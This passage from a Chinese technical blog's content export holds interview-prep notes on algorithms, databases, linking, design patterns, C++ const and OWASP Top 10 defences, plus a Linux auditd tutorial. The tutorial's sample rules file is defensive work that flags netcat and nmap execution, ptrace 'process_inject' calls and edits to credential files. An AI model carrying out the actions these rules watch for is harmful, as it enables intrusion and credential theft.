\u0026lt;\u0026lt; head.y \u0026lt;\u0026lt; endl;  if (head.x == g_row - 1) return true; for (auto d : dirs) { Pos nxt; nxt.x = head.x + d.first; nxt.y = head.y + d.second; // 坐标合法，且还未被淹  if (nxt.x \u0026lt; g_row \u0026amp;\u0026amp; nxt.x \u0026gt;= 0 \u0026amp;\u0026amp; nxt.y \u0026lt; g_col \u0026amp;\u0026amp; nxt.y \u0026gt;= 0 \u0026amp;\u0026amp; !visited[nxt.x][nxt.y]) { // cout \u0026lt;\u0026lt; \u0026#34;goto: \u0026#34; \u0026lt;\u0026lt; nxt.x \u0026lt;\u0026lt; \u0026#34;,\u0026#34; \u0026lt;\u0026lt; nxt.y \u0026lt;\u0026lt; endl;  // cout \u0026lt;\u0026lt; \u0026#34;This point is watered at day \u0026#34; \u0026lt;\u0026lt; watered[nxt] \u0026lt;\u0026lt; endl;  q.push(nxt); visited[nxt.x][nxt.y] = 1; } } } return false; } int latestDayToCross(int row, int col, vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; cells) { g_row = row; g_col = col; Pos p; g_cells = cells; int left = 0; int right = cells.size() - 2; while (left \u0026lt;= right) { int mid = (left + right) \u0026gt;\u0026gt; 1; if (hasRoute(mid)) left = mid + 1; else right = mid - 1; } return left - 1; } }; 14 LeetCode576. 出界的路径数 576. 出界的路径数\n最近总是挂每日一题，心态受到了不小的影响啊……\nwdnmd记忆化搜索还卡时间复杂度是怎么回事？？\n关键剪枝：当使用 maxMove 步直上/直下/直左/直右都无法到达边界的时候，直接返回 0 。\n淦！！\n15 数据库并发导致的问题 在网上若干资料中看到了相互矛盾的解释，直接怒而翻教材，应该是比较权威的了吧……\n由于 事务是并发控制的基本单位 ，其ACID特性需要得到保证。并发操作带来的数据不一致性包括丢失修改、不可重复读和读“脏”数据。\n15.1 丢失修改 两个事务 T1 和 T2 读入同一数据并修改， T2 提交的结果破坏了 T1  提交的结果，导致 T1 的修改被丢失。\n15.2 不可重复读 事务 T1 读取数据后，事务 T2 执行更新操作，使 T1 无法再现前一次读取结果。根据 T2 执行的操作来看，不可重复读包括三种情况：\n（1）事务 T1 读取某一数据后，事务 T2 对其进行修改。则使得 T1 两次读取的数据是不一样的。\n（2）事务 T1 读取某一数据后，事务 T2 对其进行删除。当 T1 再次读取数据时，发现某些数据消失了。\n（3）事务 T1 读取某一数据后，事务 T2 对其进行增添。当 T1 再次按照相同的条件读取数据时，发现多了一些记录。\n后两种不可重复读有时也称为 幻影 现象。\n15.3 读脏数据（脏读） 脏读是指事务 T1 修改某一数据并将其写回磁盘，事务 T2 读取同一数据后， T1 由于某种原因被撤销，这时被 T1 修改过的数据恢复原值， T2 读取到的数据与数据库中的数据就不一致了，称这些数据为 脏数据 。\n15.4 不可重复读和幻读的区别 根据 [15.2节](#15.2 不可重复读) 中对不可重复读的描述，我们可以将后两种情况称为 幻读 。\n网络上的各种资料，多用 不可重复读 来指代第一种情况，而用 幻读 来指代后两种情况。这样，不可重复读和幻读的区别就在于：不可重复读指的是数据内容的不一致，而幻读指的是数据数量的不一致。\n在使用锁来实现隔离机制的时候，针对不可重复读只需要使用 行锁 ，而针对幻读的现象需要使用 表锁 。\n15.5 四个隔离等级 事务的隔离级别有四，它们对脏读、不可重复读和幻读的解决效果分别如下：\n   事务隔离级别 脏读 不可重复读 幻读     读未提交 是 是 是   读已提交 否 是 是   可重复读 否 否 是   串行化 否 否 否    16 程序装入和链接 创建进程首先要将程序和数据装入内存。将用户源程序变为可在内存中执行的程序，通常需要以下几个步骤：\n 预处理。展开头文件、宏替换、去掉注释、条件编译。 编译。将代码转换成汇编代码，并在这个步骤中完成两件工作：  每个文件中产生一个函数地址符表，存储着当前文件内包含的各个函数的地址； 调用函数的代码会编译为 call 指令，而 call 指令跟随的地址上是一条 jmp 指令， jmp 指令跟随的地址才是被调用函数的地址。为 call 指令补充上地址是在链接的时候才完成的。   汇编。将编译出的文件转换成机器码。 链接。将编译后形成的一组目标模块及所需的库函数链接成一个完整的装入模块。 装入。将程序装入内存执行。  程序的链接有三种方式：\n 静态链接。在程序运行前，将各目标模块和所需的库函数链接成一个完整的可执行程序，以后不再拆开。 装入时动态链接。装入内存时边装入边链接。 运行时动态链接。对于某些目标模块的链接，是在程序执行中需要该目标模块时才执行的。其优点是便于修改和更新，便于实现对目标模块的共享。  模块在装入内存时，也有三种方式：\n 绝对装入。在编译时，若知道程序将驻留在内存的某个位置，则编译程序将产生绝对地址的目标代码。绝对装入程序按照装入模块中的地址，将程序和数据装入内存。该方式只使用于单道程序环境，绝对地址可在编译或汇编时给出，也可由程序员直接赋予。 可重定位装入。多道程序环境下，模块中使用的地址一般是相对地址（相对于起始地址 0 ）。可重定位装入会在装入时将模块中的相对地址修改为绝对地址（相对于装入的位置）。**装入时对目标程序中指令和数据的修改过程称为 重定位 ，地址变换通常是在装入时一次性完成的，又称为 静态重定位 **。 运行时动态装入。装入程序把模块装入内存后，并不立即把装入模块中的相对地址替换为绝对地址，而是把这种转换推迟到程序真正要执行时才进行。 这种方式需要一个重定位寄存器的支持 。   Reference\n[1] 王道论坛.2021年操作系统考研复习指导[M].北京:电子工业出版社,2020:129::131\n[2] 编译的整个过程：预编译、编译、汇编、链接 - mhq_martin - 博客园 (cnblogs.com)\n 17 设计模式简述 设计模式（Design Pattern）代表了最佳的实践，通常被有经验的面向对象的软件开发人员所采用。设计模式是软件开发人员在软件开发过程中面临的一般问题的解决方案。这些解决方案是众多软件开发人员经过相当长的一段时间的试验和错误总结出来的。\n设计模式的目的是为了可重用代码，提高代码的可扩展性和可维护性。\n设计模式主要有几种类型：\n 创建型模式 。该模式重点关注如何创建对象，在创建对象时隐藏创建逻辑，从而使对象的创建和使用相互分离。 结构型模式 。该模式重点考虑类和对象的组合，目的是获得更好、更灵活的结构。 行为型模式 。该模式重点关注算法和对象之间的职责分配，通过安排对象之间的合理通信来更好地完成整体的任务。  设计模式有如下几个原则：\n  开闭原则 。软件 对扩展开放，对修改关闭 。简而言之，程序在进行升级的时候，只对现有模块进行扩展，而尽量不对原有代码进行修改。\n  里氏替换原则 。子类能够完全替换父类。显然，只有当子类替换掉父类，且原有的方法不受影响时，父类才算真正得到了复用。\n  依赖倒转原则 。针对接口编程，依赖于抽象而不依赖于具体。\n  接口隔离原则 。使用多个隔离的接口，比使用单个接口更好。我认为该原则的思想是将复杂问题拆解，降低类之间的耦合。\n  迪米特法则 。又称最小知道原则，一个实体应该尽量少地与其他实体发生作用，使得系统模块相对独立。\n  合成复用原则 。尽量使用合成/聚合的方式，而不是使用继承。而若使用继承，则需要遵守里氏替换原则。\n 注、使用继承的方式进行复用虽然比较简单，但破坏了父类的封装性。使用合成或聚合复用，指的是将已有对象纳入新对象中，使之成为新对象的一部分，该方法又被称为“黑箱”复用。\n    Refernence:\n[1] [合成复用原则——面向对象设计原则 (biancheng.net)](http://c.biancheng.net/view/1333.html#:~:text=合成复用原则的重要性 1 它维持了类的封装性。因为成分对象的内部细节是新对象看不见的，所以这种复用又称为“黑箱”复用。,2 新旧类之间的耦合度低。这种复用所需的依赖较少，新对象存取成分对象的唯一方法是通过成分对象的接口。 3 复用的灵活性高。这种复用可以在运行时动态进行，新对象可以动态地引用与成分对象类型相同的对象。)\n[2] 设计模式简介 | 菜鸟教程 (runoob.com)\n[3] 设计模式 - 廖雪峰的官方网站 (liaoxuefeng.com)\n 18 C++中的const关键字 无论 const 关键字出现在什么地方，不管它用于修饰指针、变量、函数或类，其核心作用都是防止它修饰的目标受到修改。\n18.1 const变量 const 关键字指定一个变量的值为常值，编译器将禁止对这一变量的修改。\n// constant_values1.cpp int main() { const int i = 5; i = 10; // C3892  i++; // C2105 } 我们可以使用 const 关键字来代替 #define ，这一做法会使得编译器对这一常变量进行 类型检查 ，而使用宏定义得到的对象只是在编译之前进行预处理替换，没有类型检查。\n如果此类变量作为一个类的成员变量，则必须使用 初始化列表 来进行初始化。\n在C语言中， const 变量默认为 外部链接 类型，则其只能出现在单个 源文件 中；而C++中的 const 变量与之相反，而我们知道内部链接类型的变量可以出现在 头文件 中；当然，如果希望其他源文件也访问到这一 const 变量，则需要使用 extern 来声明。\nconst 关键字也可用于指针的声明当中：\n// constant_values3.cpp int main() { char *mybuf = 0, *yourbuf; char *const aptr = mybuf; *aptr = \u0026#39;a\u0026#39;; // OK  aptr = yourbuf; // C3892 } 以一种简单的方式来区分 常指针 和 常量指针 ：如果 const 出现在星号 * 后面，则它修饰的是指针变量本身；如果 const 出现在星号 * 前面，则它修饰的是指针指向的变量。\n 如果难以区分，不妨从英文的角度出发，观察以下两个变量：\nconst char* p1; // pointer to constant data char* const p2; // constant pointer 是不是好懂了一些？\n 18.2 const成员函数 声明一个带有 const 关键字的成员函数表明该函数是一个“只读”函数，其内部代码将不会改变任何成员变量。这类函数不能修改任何非静态变量、且只能调用其他的 const 函数。\n声明和定义 const 函数的办法是在函数形参的小括号后面加上 const 关键字。\n// constant_member_function.cpp class Date { public: Date( int mn, int dy, int yr ); int getMonth() const; // A read-only function  void setMonth( int mn ); // A write function; can\u0026#39;t be const private: int month; }; int Date::getMonth() const { return month; // Doesn\u0026#39;t modify anything } void Date::setMonth( int mn ) { month = mn; // Modifies data member } int main() { Date MyDate( 7, 4, 1998 ); const Date BirthDate( 1, 18, 1953 ); MyDate.setMonth( 4 ); // Okay  BirthDate.getMonth(); // Okay  BirthDate.setMonth( 4 ); // C2662 Error } 19 OWASP top 10（2017） 19.1 注入 解释 ：该漏洞的核心是缺乏对Web应用程序使用的数据的验证和清理。任何接受参数作为输入的内容都可能受到注入攻击。\n防护 ：\n 使用安全的API。 对输入设置白名单，或者相关输入验证。 转义特殊记录。 在查询中使用 LIMIT 或其他SQL控件，防止SQL注入时大量地泄露记录。（考虑最坏情况……）  19.2 失效的身份认证 解释 ：该漏洞的核心是身份认证机制在某处实现上存在问题。如使用单因素身份认证、使用弱口令、在用户注销之后没有及时清除Session、在URL中暴露会话ID等。\n防护 ：\n 多因素身份认证。 弱口令检查。 统一注册、凭据恢复等接口，防止用户枚举攻击。 会话ID的合理管理，如登录之后生成高度随机的会话ID、妥善存储（肯定不能出现在URL里……）、登出之后及时销毁。  19.3 敏感数据泄露 解释 ：该漏洞的核心是密码算法的失效（Cryptographic Failures）。数据在 存储 、 传输 或 交互 过程中没有使用合理的加密算法进行保护，使得其中敏感数据被泄露。\n防护 ：\n 对没必要存储的敏感数据予以及时销毁，存储的敏感数据确保加密。 使用最新的、强大的算法、协议、密钥，且密钥妥善管理。 确保数据传输过程中受到加密保护，如使用HSTS。  19.4 XML外部实体（XXE） 解释 ：许多较早的或配置错误的XML处理器解析了XML文件中的外部实体引用，攻击者可以利用这些外部实体窃取服务侧的内部文件和共享文件、实行内网扫描、远程代码执行和拒绝服务攻击（可以归纳为SSRF吗？）\n防护 ：\n 使用简单的数据格式（如JSON），避免对敏感数据进行序列化。 XML库的版本检查，及时更新修复相关组件。 在XML解析器上禁用外部实体和DTD（文档定义类型）。 服务端实施白名单机制，对输入进行过滤和清洗。  19.5 失效的访问控制 解释 ：Broken Access Control ，和19.2中的 Broken Authentication 是有区别的。个人理解，失效的访问控制主要是指攻击者已经具备了一个合法用户，只是他所对应的访问权限可以经由某种手段进行提升，从而访问某些未经授权的功能或数据。\n防护 ：\n 访问控制只有在服务端有效 。 除公有资源外，默认情况下拒绝访问其他资源。 建立一次性的访问控制机制，并在整个应用中不断重用他们。 建立访问控制模型以强制执行所有权记录，而不是接受用户创建、读取、更新或删除的任何记录（强制访问控制MAC？）。 记录失败的访问控制，并及时告警。  19.6 安全配置错误 解释 ：顾名思义。这个问题是很常见的安全问题，通常由于不安全的默认配置、不完整的临时环境、开源云存储、错误的HTTP标头配置以及包含敏感信息的详细错误信息所造成的。\n防护 ：\n 实施安全的安装过程，如开发、测试、生产环境中保持相同安全配置，且口令不同。安装过程尽量自动化，以减小出错的可能。 搭建最小化平台，移除所有不必要的功能、组件、文件及示例。 检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分。检查过程中，特别注意云存储的权限。 向客户端发送安全指令，如安全标头（想到了CSP、HTTP-Only）。  19.7 跨站脚本（XSS） 解释 ：网页中使用了用户提供的参数，且这些参数没有被妥善地转义，可能引发浏览器将这些参数当作原本网页中的脚本，予以执行。\n防护 ：\n 使用设计上就会自动编码来解决XSS问题的框架，如Ruby 3.0或React JS。了解每个框架XSS保护的局限性，并适当地处理未覆盖的用例。 根据HTML上下文对所有不受信任的HTTP请求数据进行转义 or 编码。 内容安全策略（CSP） ，如果不存在本地文件上传的其他漏洞，将绝杀。（大致思想是向客户端发送安全指令，限定只执行某些域名下的脚本）。  19.8 不安全的反序列化 解释 ：序列化是将对象的状态信息转换为可以存储或传输的形式的过程。在序列号期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，来重建该对象。不安全的反序列化是指攻击者提供恶意的篡改过的对象，使得应用程序和API变得脆弱。\n针对反序列化漏洞，主要有两种攻击形式：\n 在反序列化过程中改变应用逻辑或实现远程代码执行，称为 对象和数据结构攻击 ； 篡改序列化之后的数据，实现访问控制相关的攻击；  防护 ：\n 唯一安全的架构是不接受来自不受信源的序列化对象。 可以考虑执行完整性检查，如对序列化对象进行数字签名，防止恶意对象创建或数据篡改。 将反序列化代码隔离在低特权环境中运行。 监控反序列化行为，记录反序列化的例外情况和失败信息。  19.9 使用含有已知漏洞的组件 解释 ：组件（库、框架和其他模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能造成严重的数据丢失或服务器接管。\n防护 ：\n 移除不使用的依赖、不需要的功能、组件、文档。 利用各种工具来持续记录客户端和服务端以及它们的依赖库的版本信息。持续监控CVE等信息来判断已有组件是否有漏洞。 使用官方渠道安全地获取组件，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险。 监控那些不再维护或不发布安全补丁的库和组件。  19.10 不足的日志记录和监控 解释 ：不足的日志记录和监控，使得攻击者在系统中可以更隐蔽地驻留、攻击、横向移动、销毁证据。\n防护 ：\n 确保所有登录、访问控制失败、输入验证失败都能被记录到日志中去，并保留足够的用户上下文信息，以识别可疑或恶意账户，并为后期取证留足时间。 确保日志以一种能够被集中日志管理解决方案使用的形式生成。 确保高额交易有完整性控制的审计信息，且审计信息必须防止篡改或删除。 采用有效的监控和告警机制。 采用一个应急响应机制和恢复计划。  ","date":"2021-08-29T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E7%A7%8B%E6%8B%9B-%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/","title":"秋招 | 一些知识点"},{"content":"什么是audit Linux下的audit框架提供可靠的搜集系统信息的服务，任何与安全相关（或无关）的事件都可被此框架搜集和审计。通过audit，人们可以更加详细地了解系统上发生的事情，然而，该框架并不提供额外的安全措施，在安全事件中，它仅仅是帮助人们更加清晰地认识整个事件的始末，此后亡羊补牢，为时未晚。\n简单地说，audit审计框架的工作就是监听来自内核的事件报告，并将它们写入日志文件中。\n而较为系统地说，audit框架的组件结构如图所示：\n\rimg\r\n安装 内核层的audit服务在Linux（4.18及以后）、Linux-lts（4.19及以后）、Linux-zen（4.18及以后）和Linux-hardened等版本中默认可用。如用户使用自行编译的内核，需要在编译中设置参数 CONFIG_AUDIT 。\n我们通过查看内核编译参数，可以看到系统对audit内核审计的支持情况，以CentOS 7为例：\n\rimg\r\n用户层的audit服务可以通过普通的软件安装方式获取，可以使用 systemctl 或 service 命令来控制服务的启停。\naudit内核审计的消息可以由应用或系统活动来触发，而 audit daemon（audit守护进程） 是audit框架中的重要组成部分，它负责处理内核生成的消息，例如将这些消息写入日志中或选择性地忽略。\n我们可以通过若干命令和文件来控制 audit daemon ：\n auditctl ：直接控制守护进程的行为，如添加规则等； /etc/audit/audit.rules ：内含audit守护进程的规则和各种变量； aureport ：生成系统活动的审计报告； ausearch ：在审计日志中对各类事件进行搜索； auditspd ：用于将事件消息通知给其他应用的守护进程，有了此进程，事件就不需要通过磁盘上的audit日志来进行传递了； autrace ：用于追踪某一进程的命令，类似 strace ； etc/audit/auditd.conf ：关于日志记录的配置文件。  添加规则 基础 注意，audit框架对事件的审计是全面而细致的，添加规则之前，我们需要对规则有充分的认知，否则，可能仅仅由于一条规则，我们的日志文件就被瞬间写满了。\naudit规则的加载可以通过命令行工具 auditctl 或使用命令 auditctl -R /etc/audit/audit.rules 从规则文件中批量读取。\n通过 auditctl 命令添加的规则会在系统重启之后丢失。如希望使规则持续生效，就将它们写入 /etc/audit/audit.rules 文件中，通过命令 rcauditd resatrt 重启audit服务使规则文件生效。\n对文件和目录访问的审计 监控某一特定文件的访问行为属于audit框架的基础用法。使用 -w 选项（表示”watch“）来指定你要监控的文件或目录。最常见的规则是监控对 passwd 文件的访问：\n# auditctl -w /etc/passwd -p rwxa 也可以监控对某一路径的访问：\n# auditctl -w /etc/security/ 上面给出的第一条规则监控了对 etc/passwd 文件的所有读操作 r 、写操作 w 、执行 x 和属性变更操作 a ，此类规则指定的文件需要事先存在；\n第二条规则监控了对 etc/security 目录的所有访问，默认情况下，目录相关的规则只记录这一目录下的文件创建/删除，希望对其下的文件进行进一步的监控，就使用第一条规则来指定具体文件。\n可以通过以下命令来查看所有处于活动状态的规则：\n# auditctl -l 可以通过以下命令来删除 所有 规则：\n# auditctl -D 当确认规则无误之后，可以将它们添加到 /etc/audit/audit.rules 文件末尾：\n-w /etc/passwd -p rwxa -w /etc/security/ 对系统调用的审计 通过 -a 选项可以对系统调用进行审计。\n例如，对 chmod 调用进行审计，以检测文件属主的变更：\n# auditctl -a entry,always -S chmod 可以通过 syscalls 页面找到所有系统调用。\n对系统调用进行审计时，可以使用 -F 来添加对某个键值的筛选，例如：\n# 审计所有第二个参数为 4 的 access 调用 -a entry,always -S access -F a1=4 # 审计所有不成功的 open 调用 -a exit,always -S open -F success!=0 下面这条规则也使用了 -F 选项，但是它的审计内容较为特殊：\n-a task,always -F auid=0 当一个进程被创建或克隆时， task 规则就起作用了。在上面这条示例中，我们将选中所有具备 auid=0 的任务，并在它们发生时进行记录。每个进程都会在用户登录时被赋予一个 audit ID ，这一ID不随着用户身份的改变而改变，且子进程会继承父进程的 auid ，通过这个ID我们可以唯一确定原始用户。\n对无用消息的过滤 在日志记录过程中，有必要避免对不重要的消息进行记录，从而既方便我们对日志进行分析，也减小日志文件的体积。\n可以添加如下形式的规则来对部分消息进行过滤：\n# 以下规则添加在 /etc/audit/rules.d/quiet.rules 文件中 --- -A exclude,always -F msgtype=SERVICE_START -A exclude,always -F msgtype=SERVICE_STOP -A exclude,always -F msgtype=BPF audit 日志 日志的基本格式 默认情况下，audit日志存放在 /var/log/audit 目录下。下面先看一条典型的audit日志示例：\n# 命令执行审计 type=SYSCALL msg=audit(1234874638.599:5207): arch=c000003e syscall=2 success=yes exit=4 a0=62fb60 a1=0 a2=31 a3=0 items=1 ppid=25400 pid =25616 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts1 ses=1164 comm=\u0026#34;less\u0026#34; exe=\u0026#34;/usr/bin/less\u0026#34; key=\u0026#34;doc_log\u0026#34; type=CWD msg=audit(1234874638.599:5207): cwd=\u0026#34;/root\u0026#34; type=PATH msg=audit(1234874638.599:5207): item=0 name=\u0026#34;/var/log/audit/audit.log\u0026#34; inode=1219041 dev=08:06 mode=0100644 ouid=0 ogid=0 rdev=00:00 这是执行了命令 less /var/log/audit/audit.log 之后得到的日志，audit通过一事件产生了 三条 消息，这三条消息紧密联系，单独拎出任何一条来看都是没有意义的。\n我们逐一解释这些日志中的字段。首先是第一条日志，它呈现了如下的信息：\n  type ：事件的类型。第一条消息中的 type=SYSCALL 表明这一消息是由系统调用触发； CWD 表明这一消息记录了命令执行时的工作目录（current working directory）； PATH 消息记录了传递给系统调用的路径。注意， PATH 消息仅仅是忠实地记录了命令执行时传递的路径参数，对于一个相对路径，我们需要结合 CWD 来分析出绝对路径。\n  msg ：包裹在小括号之间的内容，表示消息ID。它由两部分组成，冒号 : 前的部分是UNIX时间戳，冒号后的部分是真实的事件ID。同一个系统调用触发的所有消息都具备相同的ID，便于我们进行关联分析。\n  arch ：执行系统调用的CPU架构。在使用 ausearch 命令搜寻日志时（下文会提到），使用 -i 选项来解码这一字段的值。\n  syscall ：记录了系统调用的编号，一般从 /usr/include/asm/unistd.h 文件中得出，也因此可能随着架构的不同而改变。本例中， syscall=2 表示 less 程序所使用的 open 系统调用。\n  success ：事件是否成功。\n  exit ：系统调用的返回值，随着不同系统调用的实现而改变。\n  a0~a3 ：系统调用的前四个参数，以数字形式呈现。这些值也会随着不同系统调用的实现而不同。在本例中，我们记录到如下的值：\na0=62fb60 # 文件路径字符串的地址 a1=0 # 标志位 a2=31 # 工作模式 a3=0\t# 未使用   items ：传递给本应用的字符串个数。\n  ppid ：父进程ID。\n  pid ：进程ID。\n  auid ：在 对系统调用的审计 一节中提过的 audit ID ，可以作为用户的标识。\n  uid ：启动本进程的用户ID， 0 表示root用户。\n  gid ：启动本进程的用户组ID。\n  euid，suid，fsuid，egid，sgid，fsgid ：略。\n  tty ：应用启动时使用的终端，本例中使用了一个 伪终端（pseudoterminal） 。\n  ses ：登录会话ID。用户登录时将为这一属性赋值，可以用于将进程活动与某一次登录事件联系起来。\n  comm ：任务列表中呈现的应用名称。\n  exe ：解析得到的二进制文件路径。\n  subj ：记录本进程是否属于某个安全上下文，例如在AppArmor中，如果定义了本进程的安全上下文，则其属性也将得到记录。\n  key ：如果需要对大量的文件或目录进行监控，可以在规则中添加这一字段，方便后续使用 ausearch 等工具查找。\n  第二条日志则呈现了 less 命令执行时的工作目录信息，别无其他意义。\n第三条日志呈现的信息解释如下：\n item ：在本例中， item 字段表示 a0 参数，即 SYSCALL 消息中记录的系统调用的第一个参数。如果某个系统调用接收了多个路径参数，就会有更多的 PATH 类型的消息产生。 name ：呈现传递给系统调用的具体路径名称。 inode ：表示与 name 相关的 inode 编号。 dev ：文件存储的具体设备。 mode ：文件访问控制权限的数字表示。在本例中，root用户具有读写的权限、root所在的用户组具有读取文件的权限，而其余的所有用户（组）则完全不具备本文件的访问权限。 ouid、ogid ：指向相关 inode 的UID和GID。 rdev ：本例中没有意义。该字段仅适用于块设备或字符设备，与文件无关。  日志的搜索与分析 audit框架提供了一些日志查找工具，以便查看系统上发生的一系列事件。\n通过pid 通过进程id来查看特定事件：\n# ausearch -p 1 该命令将呈现所有与ID为1的进程相关的事件。\n通过key 通过 key 来管理事件是audit框架中一个很棒的特性，推荐日常使用。\n可以在规则中使用 -k 选项来为相关事件打上标签，方便后续查找：\n# auditctl -w /etc/passwd -p rwxa -k KEY_pwd 紧接着，查找所有带有键值 KEY_pwd 的事件，ausearch将呈现所有与文件 /etc/passwd 相关的事件：\n# ausearch -k KEY_pwd 查看异常事件 方才介绍了 ausearch 的基本用法，而此前提及的 aureport 工具更擅长快速地报告系统上的异常事件，例如，网卡工作在混杂模式、进程或线程由于ENOMEM等错误崩溃推出等等。\n最简单的查看异常的命令是：\n# aureport -n 也可以使用此工具生成自定义报告，详见 aureport 文档 。\n值得记录的文件或系统调用 始终注意，所有列入审计的文件和系统调用都将产生日志，因此要对日志的数量保持谨慎。一般来说，与安全相关的事件和文件都需要被记录，如IDS、IPS、anti-rootkits等等；与此相对地，对于 write 类型的系统调用就没必要进行记录，否则即便是最微不足道的写入操作都会被记录到日志中。\n人们可以设置一系列复杂的规则来实现对审计事件的精细管控，详见 auditctl文档 。\n本文中给出两份可用度较高的规则文件 [附件1](#附件1 推荐规则（1）) 和 [附件2](#附件2 推荐规则（2）) ，可以直接将它们复制到 /etc/audit/audit.rules 中。\n远程日志传输 audit框架提供了用于实现日志转发的插件，可以将本地日志转发到远程auditd主机上。\n发送日志 实现日志的发送，需要具备 audisp-remote 插件，该插件由audit安装包默认自带。通过修改如下文件来激活插件：\n# 文件 /etc/audisp/plugins.d/au-remote.conf --- active = yes direction = out path = /usr/bin/audisp-remote type = always format = string 并在如下文件中设置目标主机（即日志发送的对象）：\n# 文件 /etc/audisp/audisp-remote.conf --- remote_server = [domain_name | ip] port = 60 ## localport = optional transport = tcp 接收日志 接受日志的配置较为简单：\n# 文件 /etc/audit/auditd.conf --- tcp_listen_port = 60 tcp_listen_queue = 5 tcp_max_per_addr = 1 ## tcp_client_ports = 1024-65535 #optional tcp_client_max_idle = 0 参考资料 [1] Audit framework - ArchWiki (archlinux.org)\n[2] Understanding Linux Audit | Security Guide | SUSE Linux Enterprise Server 11 SP4\n附件1 推荐规则（1） # This file contains the auditctl rules that are loaded # whenever the audit daemon is started via the initscripts. # The rules are simply the parameters that would be passed # to auditctl. # First rule - delete all -D # Increase the buffers to survive stress events. # Make this bigger for busy systems -b 320 # Feel free to add below this line. See auditctl man page -w /etc/passwd -p wa -k passwd_changes -w /etc/selinux/ -p wa -k selinux_changes -w /sbin/insmod -p x -k module_insertion -w /etc/shadow -p wa -k shadow_changes -w /etc/sysconfig -p wa -k sysconfig_changes -w /etc/audit/audit.rules -p wa -k audit_rules_changes -w /etc/audit/auditd.conf -p wa -k audit_conf_changes -w /usr/sbin/vpnc -k vpnc_exec -p x -w /usr/bin/stunnel -k stunnel_exec -p x -w /usr/bin/nc -p x -k ncat_exec -w /usr/bin/nmap -p x -k nmap_exec -w /usr/bin/sudo -p x -k sudo_exec -w /usr/bin/su -p x -k su_exec -w /etc/group -p wa -k group_changes -w /var/log/wtmp -p w -k wtmp_changes -w /var/log/btmp -p w -k btmp_changes -w /usr/bin/getent -k getent_exec -p x -w /etc/rc.d/init.d -p wa -k initd_changes -w /etc/security/opasswd -p wa -k opasswd_changes -w /etc/gshadow -p wa -k gshadow_changes -w /etc/securetty -p wa -k securetty_changes -w /etc/login.defs -p wa -k login_defs_changes -w /etc/ld.so.conf -p wa -k ld_so_conf_changes -w /etc/sudoers -p wa -k sudoers_changes -w /etc/profile -p wa -k profile_changes -w /etc/hosts -p wa -k hosts_changes -w /etc/inittab -p wa -k inittab_changes -w /etc/sysconfig/iptables -p wa -k iptables_changes -w /etc/hosts.allow -p wa -k hosts_allow_changes -w /etc/hosts.deny -p wa -k hosts_deny_changes -w /root/.ssh/authorized_keys -p wa -k authorized_keys_changes -w /etc/crontab -p wa -k crontab_changes -w /etc/ssh/sshd_config -p wa -k sshd_config_changes -a always,exit -F arch=b32 -S ptrace -k process_inject -a always,exit -F arch=b64 -S ptrace -k process_inject -w /usr/bin/rdesktop -p x -k rdesktop_exec -w /etc/exports -p wa -k exports_changes -w /lib/modules/ -p wa -k lib_modules_changes -w /sbin/iptables-multi -p x -k iptables_exec -w /var/spool/cron/root -p wa -k spool_cron_root_changes -w /etc/resolv.conf -p wa -k resolv_conf_changes -a always,exit -S execve -k execve_event -a exit,always -S all -F euid=0 -F perm=awx -k root-commands 附件2 推荐规则（2） auditd/audit.rules at master · Neo23x0/auditd · GitHub\n","date":"2021-08-25T00:00:00Z","permalink":"https://xrg.fj.cn/p/audit-%E7%AE%80%E8%BF%B0/","title":"audit 简述"},{"content":"题目 给你一个数组 target ，包含若干 互不相同 的整数，以及另一个整数数组 arr ，arr 可能 包含重复元素。\n每一次操作中，你可以在 arr 的任意位置插入任一整数。比方说，如果 arr = [1,4,1,2] ，那么你可以在中间添加 3 得到 [1,4,3,1,2] 。你可以在数组最开始或最后面添加整数。\n请你返回 最少 操作次数，使得 target 成为 arr 的一个子序列。\n一个数组的 子序列 指的是删除原数组的某些元素（可能一个元素都不删除），同时不改变其余元素的相对顺序得到的数组。比方说，[2,7,4] 是 [4,2,3,7,2,1,4] 的子序列（加粗元素），但 [2,4,2] 不是子序列。\n示例1\n 输入： target = [5,1,3], arr = [9,4,2,3,4] 输出： 2 解释： 你可以添加 5 和 1 ，使得 arr 变为 [5,9,4,1,2,3,4] ，target 为 arr 的子序列。  示例2\n 输入： target = [6,4,8,1,3,2], arr = [4,7,6,2,3,8,6,1] 输出： 3  数据范围\n 1 \u0026lt;= target.length, arr.length \u0026lt;= 10^5 1 \u0026lt;= target[i], arr[i] \u0026lt;= 10^9 target 不包含任何重复元素。  分析 1 直观解法 首先，我们可以非常直接地想到两个数组的 最长公共子序列 的问题。\n我们求出 target 和 arr 的最长公共子序列，然后在 arr 中，对这个序列进行元素的增添，即可使得 target 变成 arr 的子序列。于是答案应该是： target.size() - LongestCommonSequence.size() 。\n然而，最长公共子序列所需的DP，时间复杂度是 O(n^2) ，根据题目的数据范围，会超时。\n给出超时代码如下，可以通过 73/82 个用例。\nclass Solution { public: int minOperations(vector\u0026lt;int\u0026gt;\u0026amp; target, vector\u0026lt;int\u0026gt;\u0026amp; arr) { // dp[a][b] target 从a开始,arr从b开始 得到的最长子序列  // target[a] == arr[b],则 dp[a][b] = dp[a - 1][b - 1] + 1  // target[a] != arr[b]。则 dp[a][b] = max(dp[a][b - 1], dp[a - 1][b], dp[a - 1][b - 1])  vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; dp(target.size() + 1, vector\u0026lt;int\u0026gt;(arr.size() + 1, 0)); for (int a = 0; a \u0026lt; target.size(); a++) { for (int b = 0; b \u0026lt; arr.size(); b++) { if (target[a] == arr[b]) { dp[a][b] = (a == 0 || b == 0) ? 1 : dp[a - 1][b - 1] + 1; } else { if (a != 0 \u0026amp;\u0026amp; b != 0) { dp[a][b] = max( max(dp[a][b - 1], dp[a - 1][b]), dp[a - 1][b - 1] ); } else if (a == 0 \u0026amp;\u0026amp; b == 0) { dp[a][b] = 0; } else if (a == 0) { dp[a][b] = dp[a][b - 1]; } else { dp[a][b] = dp[a - 1][b]; } } } } return target.size() - dp[target.size() - 1][arr.size() - 1]; } }; 